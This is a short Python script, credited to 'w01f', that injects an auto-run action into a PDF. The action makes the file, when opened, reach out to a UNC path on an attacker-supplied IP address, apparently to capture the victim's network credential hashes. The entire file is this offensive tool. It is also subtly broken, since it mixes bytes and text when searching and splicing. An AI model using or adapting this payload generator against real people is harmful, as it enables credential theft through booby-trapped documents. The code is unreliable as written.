import argparse

def inject_payload(pdf_data, target_ip=None, domain_name=None):
    file_path = f'\\\\\\\\{target_ip}\\\\{domain_name}' if target_ip and domain_name else '\\\\test'
    pdf_payload = f'/AA <</O <</F ({file_path})/D [ 0 /Fit]/S /GoToE>>>>'
    payload_insert_point = pdf_data.find('/Parent') + 13    
    modified_data = pdf_data[:payload_insert_point] + pdf_payload + pdf_data[payload_insert_point:]   
    return modified_data

def main():
    parser = argparse.ArgumentParser(description="Injects a payload into a PDF file by w01f")
    parser.add_argument("pdf_path", help="Path to the PDF file to be modified.")
    parser.add_argument("--ip_address", help="Optional: IP address to use in the payload.", default=None)
    parser.add_argument("--domain_name", help="Optional: Domain name to include in the payload.", default=None)
    args = parser.parse_args()

    print(f"[*] PdfFile: {args.pdf_path}")
    if args.ip_address:
        print(f"[*] IP Address: {args.ip_address}")
    if args.domain_name:
        print(f"[*] Domain Name: {args.domain_name}")

    with open(args.pdf_path, 'rb') as file:
        pdf_content = file.read()

    updated_pdf_content = inject_payload(pdf_content, args.ip_address, args.domain_name)
    output_pdf_path = args.pdf_path + '.payload.pdf'

    print(f"Payload: {output_pdf_path}")
    with open(output_pdf_path, 'wb') as output_file:
        output_file.write(updated_pdf_content)

    print("All Done")

if __name__ == "__main__":
    main()
